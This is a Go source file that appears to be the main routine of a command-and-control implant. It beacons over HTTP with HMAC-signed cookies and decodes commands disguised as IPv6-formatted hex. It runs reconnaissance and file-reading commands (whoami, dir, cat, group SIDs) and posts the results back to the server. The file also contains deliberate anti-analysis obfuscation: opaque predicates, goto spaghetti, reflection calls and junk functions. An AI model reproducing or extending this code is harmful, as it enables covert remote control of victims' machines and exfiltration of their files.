package main

import (
	"NULL/0x27894365/base_config/rogue"
	"NULL/0x27894365/base_config/shared"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"math/rand"
	"net/http"
	b "reflect"
	"regexp"
	"strings"
)

// ResponseData Struct to hold the response format from the server
// The key is the HMAC used to verify the data retrieved using a shared secret
type ResponseData struct {
	Message string `json:"message"`
	Key     string `json:"key"`
}

// CompUUID The 4 byte ID for the implant to use set at compile time
var CompUUID string

// Used to mess up static analysis
type unknown struct {
	primaryField bool
}

// procOut is out the output from command processing
var procOut string
var procIn string
var command string

// https://stackoverflow.com/questions/54461423/efficient-way-to-remove-all-non-alphanumeric-characters-from-large-text
// https://pkg.go.dev/regexp
// Use raw strings to avoid having to quote backslashes
func strip(in string) string {
	reg, _ := regexp.Compile(`[^a-zA-Z0-9\/\\:\-\. ]+`)
	return reg.ReplaceAllString(in, "")
}

func BB176245(x int) bool {
	return (x % 2) == 1 // Returns true for 5 and false for 2
}

func BB23598623() bool {
	hidden := unknown{primaryField: false}
	v := b.ValueOf(hidden)
	return v.Field(0).Bool()
}

func X1A9T(x int) bool {
	rand.NewSource(int64(x) ^ 0xDEADBEEF)

	a := (x*3 + 42) ^ (x >> 2)
	b2 := (a & 0xFF) + ((a >> 8) & 0xFF) + ((a >> 16) & 0xFF)
	c := (a * b2) ^ 0xCAFEBABE
	d := (c % 97) * (x % 31)

	hash := sha256.Sum256([]byte(fmt.Sprintf("%d", d)))
	intCheck := int(hash[0]) & 1

	if intCheck != 1 && ((x*x+x)&1 == 0) {
		d += x * x
	}

	intCheck1 := ((x ^ 0xABCD) & 0xF0F0) ^ ((d & 0x1234) | 0x55AA)
	if intCheck1 > 100000 {
		d += x << 2
	} else {
		d -= x >> 3
	}

	result := ((d & 0xF) ^ 0xA) == 0xF
	toGet1 := (result && (d|x)%17 == 0) || (d^0xFF != x^0x1234)

	return toGet1 || x == 42
}

// runCommands is where command processing occurs
// since this was architected in such a way that commands could be two places, a singular function was used
func runCommands(in string) (out string) {
	switch in {
	case "pwd":
		procOut = shared.GetCurrentDir()
	case "whoami":
		procOut = shared.GetCurrentUser()
	case "groupSID":
		procOut = shared.GetGroupsSID()
	case "dir":
		procOut = shared.GetDir(procIn)
	case "cat":
		procOut = shared.ReadFile(procIn)
	}
	return
}

func main() {
	/*
		Todo:

	*/
startpoint:
	seed := "supersecretseedvalue"
	secureFunc := shared.NewSecureFunction(seed)
	initCouner := secureFunc.DeriveCount()

	//q.TimingCheck()
	//q.KillTheChild()
	switch BB23598623() {
	case true:
		rogue.Func549687354()
		rogue.FuncDF7858354()
		goto XXSFDgs12
	case false:
		goto gabbagool
	salami:
		if BB176245(5) {
			// Load configuration from embedded data
			conf, err := shared.LoadConfig()
			if err != nil {
				// log.Fatalf("Failed to load config: %v", err)
				break
			}

			maxRetries := 3
			for {
				baseUrl := ""
				baseUrl = conf.Method + "://" + conf.Host + ":" + conf.Port + conf.GetPath
				postUrl := ""
				postUrl = conf.Method + "://" + conf.Host + ":" + conf.Port + conf.PostPath

				callKey := shared.ProtectedCaller(seed, initCouner)

				token, timestamp := secureFunc.GenerateAuthToken(CompUUID, conf.Psk2, callKey)

				//reqURL, _ := url.Parse(baseUrl)

				// Prepare the hmac params (timestamp and token)
				// params := http.Cookie{}
				hardVals := fmt.Sprintf("timestamp=%s&token=%s&id=%s", timestamp, token, CompUUID)
				fmt.Println(hardVals)

				// compedData is hardVals compressed using zlib
				// if enabled at compile time, DoComp returns the compressed object and bool true
				// if disabled (default) the function returns false
				// if false, the params are instead appended to the request uncompressed
				compedData, shouldComp := shared.DoComp(hardVals)
				// anti.TimingCheck()
				if shouldComp {

					//fmt.Println(hardVals)
					encodedData := base64.StdEncoding.EncodeToString(compedData.Bytes())
					// "da" can be changed to a randomly chosen string to cycle through
					tokenCookie := &http.Cookie{Name: "da", Value: encodedData}
					// makeGetRequest 3 times with a 10 second delay between each attempt
					// if the request is successful, break the loop
					// otherwise, the 3 timeouts cause the program to exit
					resp, err := shared.GetDataRequest(baseUrl, maxRetries, tokenCookie)
					if err != nil {
						return
					}

					defer func(Body io.ReadCloser) {
						err := Body.Close()
						if err != nil {
							return
						}
					}(resp.Body)

					// Check the response status
					if resp.StatusCode != http.StatusOK {
						// non-OK http status
						goto startpoint
					}

					// Read the response body
					body, err := io.ReadAll(resp.Body)
					if err != nil {
						// reading response body failed
						break
					}

					// Parse the JSON response
					var data ResponseData
					err = json.Unmarshal(body, &data)
					if err != nil {
						// parsing json failed
						break
					}

					// Print the values (for testing)
					// fmt.Println("Message:", data.Message)
					// fmt.Println("Key:", data.Key)

					// The response comes encoded in a hex format that mimics IPv6 IPs
					// Decode that data
					decoded, err := shared.DecodeIPv6ToString(data.Message)
					if err != nil {
						fmt.Println(err)
						break
					}
					fmt.Println("Decoded string:", decoded)

					// Verify the message with the received HMAC
					initCouner = secureFunc.DeriveCount()
					callKey := shared.ProtectedCaller(seed, initCouner)
					if secureFunc.VerifyMessageWithHMAC(data.Message, data.Key, callKey, []byte(conf.Psk1)) {
						fmt.Println("HMAC is valid!")
						// Here is where command processing should occur
						// A switch statement to run through possible command options, including using the lua engine
						// List arbitrary dir, read file, write file, execute Lua
						// Returns the result of execution (stdout or bool) or returns an error
						decoded = strip(decoded)
						command, procIn, _ = strings.Cut(decoded, " ")
						runCommands(command)

						impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
						err = shared.SendDataRequest(postUrl, procOut, maxRetries, impIdCookie)
						if err != nil {
							return
						}
						fmt.Println(initCouner)
						//break
						goto startpoint

					} else {
						fmt.Println("HMAC is invalid or message was tampered with.")
						break
					}
				} else {
					fmt.Println("Not compressing data")
					tokenCookie := &http.Cookie{Name: "token", Value: token}
					timestampCookie := &http.Cookie{Name: "timestamp", Value: timestamp}
					impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
					fmt.Println(token, timestamp, CompUUID)
					//reqURL.RawQuery = params.Encode()
					//fmt.Println(reqURL.String())
					// makeGetRequest 3 times with a 10-second delay between each attempt
					// if the request is successful, break the loop
					// otherwise, the 3 timeouts cause the program to exit
					fmt.Println(baseUrl)
					resp, err := shared.GetDataRequest(baseUrl, maxRetries, tokenCookie, timestampCookie, impIdCookie)
					if err != nil {
						//fmt.Println("Final error:", err)
						return
					}

					defer func(Body io.ReadCloser) {
						err := Body.Close()
						if err != nil {
							return
						}
					}(resp.Body)

					// Check the response status
					if resp.StatusCode != http.StatusOK {
						// non-OK http status
						goto startpoint
					}

					// Read the response body
					body, err := io.ReadAll(resp.Body)
					if err != nil {
						// reading response body failed
						break
					}

					// Parse the JSON response
					var data ResponseData
					err = json.Unmarshal(body, &data)
					if err != nil {
						// parsing json failed
						break
					}

					// Print the values (for testing)
					// fmt.Println("Message:", data.Message)
					// fmt.Println("Key:", data.Key)

					// The response comes encoded in a hex format that mimics IPv6 IPs
					// Decode that data
					decoded, err := shared.DecodeIPv6ToString(data.Message)
					if err != nil {
						//fmt.Println(err)
						break
					}
					fmt.Println("Decoded string:", decoded)

					// Verify the message with the received HMAC
					// First get the counter through the DeriveCount func
					initCouner = secureFunc.DeriveCount()
					callKey := shared.ProtectedCaller(seed, initCouner)
					switch secureFunc.VerifyMessageWithHMAC(data.Message, data.Key, callKey, []byte(conf.Psk1)) {
					case true:
						fmt.Println("HMAC is valid!")
						// Here is where command processing should occur
						// A switch statement to run through possible command options, including using the lua engine
						// List arbitrary dir, read file, write file, execute Lua
						// Returns the result of execution (stdout or bool) or returns an error
						decoded = strip(decoded)
						runCommands(decoded)

						impIdCookie := &http.Cookie{Name: "id", Value: CompUUID}
						err = shared.SendDataRequest(postUrl, procOut, maxRetries, impIdCookie)
						if err != nil {
							fmt.Println(err)
						}
						fmt.Println(initCouner)
						//break
						goto startpoint

					case false:
						fmt.Println("HMAC is invalid or message was tampered with.")
						break
					}
				}
			}
		}
	gabbagool:
		switch BB23598623() {
		case true:
			BB176245(2)
			goto startpoint
		case false:
			funcName := "X1A9T"
			args := []b.Value{b.ValueOf(23498756213049576)}
			b.ValueOf(map[string]interface{}{
				"X1A9T": X1A9T,
			}[funcName]).Call(args)
			goto salami
		}
	}
XXSFDgs12:
	var _ = 0
	var XXsd = func(XXsy72757254, XXsy6798234 int) int {
		sum := XXsy72757254 + XXsy6798234
		return sum
	}
	_ = XXsd(5, 3)

	funcName := "X1A9T"
	args := []b.Value{b.ValueOf(23498756213049576)}
	b.ValueOf(map[string]interface{}{
		"X1A9T": X1A9T,
	}[funcName]).Call(args)
}
